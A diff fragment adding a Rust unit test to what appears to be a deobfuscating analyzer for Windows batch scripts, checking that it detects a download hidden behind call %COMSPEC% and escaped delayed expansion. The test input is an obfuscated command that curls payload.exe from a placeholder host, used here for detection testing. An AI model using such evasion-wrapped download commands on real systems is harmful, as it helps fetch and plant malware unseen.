@@ -20222,6 +20222,25 @@ call !COMSPEC! /V:ON /c "set U=https://call-bang-comspec.example/payload.exe&&cu
             report.traits
         );
     }
+
+    #[test]
+    fn call_comspec_child_preserves_escaped_delayed_expansion() {
+        let script = br#"setlocal EnableDelayedExpansion
+call %COMSPEC% /V:ON /c "set U=https://call-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://call-escaped.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "call escaped COMSPEC child did not preserve delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
